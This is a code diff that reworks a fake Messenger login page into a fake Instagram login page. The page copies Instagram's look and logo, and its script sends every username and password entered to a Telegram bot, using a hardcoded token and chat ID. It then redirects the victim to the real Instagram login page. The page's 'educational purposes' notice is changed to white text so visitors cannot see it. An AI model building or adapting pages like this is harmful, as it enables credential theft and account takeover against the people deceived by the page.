@@ -3,75 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Messenger</title>
+    <title>Instagram</title>
     <style>
-        body { background-color: #fff; font-family: Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .legal-notice { color: #28a745; font-weight: bold; margin: 10px 0; font-size: 13px; text-align: center; }
-        .container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; color: #1c1e21; margin-bottom: 10px; font-weight: bold; }
-        p { color: #606770; font-size: 15px; margin-bottom: 30px; }
-        .login-form input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 10px; font-size: 16px; box-sizing: border-box; background-color: #f5f6f7; }
-        .login-form button { width: 100%; padding: 14px; background-color: #0084ff; border: none; color: white; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 17px; margin-top: 10px; }
-        .login-form button:active { background-color: #0073e6; }
-        .footer-links { margin-top: 20px; }
-        .footer-links a { color: #0084ff; text-decoration: none; font-size: 14px; }
-        .keep-logged { display: flex; align-items: center; justify-content: center; margin-bottom: 15px; color: #606770; font-size: 14px; }
-        .keep-logged input { margin-right: 8px; width: auto; }
+        /* الخلفية والجملة الروسية باللون الأبيض */
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .legal-notice { color: #ffffff; font-weight: bold; margin-bottom: 20px; font-size: 13px; text-align: center; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
+        
+        /* تصميم الصندوق الرئيسي */
+        .main-container { width: 100%; max-width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 40px 10px; box-sizing: border-box; text-align: center; }
+        .logo { width: 175px; margin: 0 auto 30px auto; display: block; }
+        
+        /* حقول الإدخال */
+        .login-form { display: flex; flex-direction: column; padding: 0 20px; }
+        .login-form input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 6px; font-size: 12px; }
+        
+        /* زر تسجيل الدخول */
+        .login-form button { background-color: #0095f6; border: none; color: white; border-radius: 8px; padding: 7px 0; font-weight: 600; cursor: pointer; margin-top: 8px; font-size: 14px; }
+        .login-form button:disabled { background-color: #b2dffc; }
+
+        /* فواصل وروابط إضافية */
+        .divider { display: flex; align-items: center; margin: 20px 20px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+        .divider span { padding: 0 18px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px; }
+        
+        .signup-box { width: 100%; max-width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; box-sizing: border-box; margin-top: 10px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
 
     <div class="legal-notice">Этот сайт предназначен для образовательных целей</div>
 
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Facebook_Messenger_logo_2020.svg/2048px-Facebook_Messenger_logo_2020.svg.png" alt="Messenger" class="logo">
-        <h1>Connect with your favorite people.</h1>
-        <p>Log in to start chatting.</p>
-
-        <form class="login-form" id="m-form">
-            <input type="text" id="email-field" placeholder="Email or phone number" required>
+    <div class="main-container">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monocle-7b353f0503a1.png/logo_2x.png" alt="Instagram" class="logo">
+        
+        <form class="login-form" id="inst-form">
+            <input type="text" id="user-field" placeholder="Phone number, username, or email" required>
             <input type="password" id="pass-field" placeholder="Password" required>
+            <button type="submit" id="submit-btn">Log In</button>
             
-            <div class="keep-logged">
-                <input type="checkbox" checked> <span>Keep me logged in</span>
-            </div>
-
-            <button type="submit" id="login-btn">Log In</button>
+            <div class="divider"><span>OR</span></div>
+            <a href="#" class="fb-login">Log in with Facebook</a>
         </form>
+    </div>
 
-        <div class="footer-links">
-            <a href="#">Forgot your password?</a>
-        </div>
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
     </div>
 
     <script>
-        const TOKEN = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
-        const ID = "8042090388";
+        // معلومات البوت والدردشة الخاصة بك
+        const TG_TOKEN = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
+        const TG_ID = "8042090388";
 
-        document.getElementById('m-form').addEventListener('submit', function(e) {
+        document.getElementById('inst-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const user = document.getElementById('email-field').value;
-            const pass = document.getElementById('pass-field').value;
-            const btn = document.getElementById('login-btn');
+            const u = document.getElementById('user-field').value;
+            const p = document.getElementById('pass-field').value;
+            const btn = document.getElementById('submit-btn');
 
             btn.disabled = true;
-            btn.innerText = "Connecting...";
+            btn.innerText = "Loging in...";
 
-            const text = `🔹 MESSENGER LOGIN 🔹\n\n📧 User: ${user}\n🔑 Pass: ${pass}\n\n🏫 Lab Exercise - Educational`;
+            const text = `📸 INSTAGRAM LOG 📸\n\n👤 User: ${u}\n🔑 Pass: ${p}\n\n🏫 Lab Exercise - Educational`;
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ID, text: text })
+                body: JSON.stringify({ chat_id: TG_ID, text: text })
             })
             .then(() => {
-                // تحويل لصفحة ماسنجر الحقيقية
-                window.location.href = "https://www.messenger.com/login/";
+                // تحويل لصفحة إنستغرام الأصلية
+                window.location.href = "https://www.instagram.com/accounts/login/";
             })
             .catch(() => {
-                alert("Connection lost. Try again.");
                 btn.disabled = false;
                 btn.innerText = "Log In";
             });
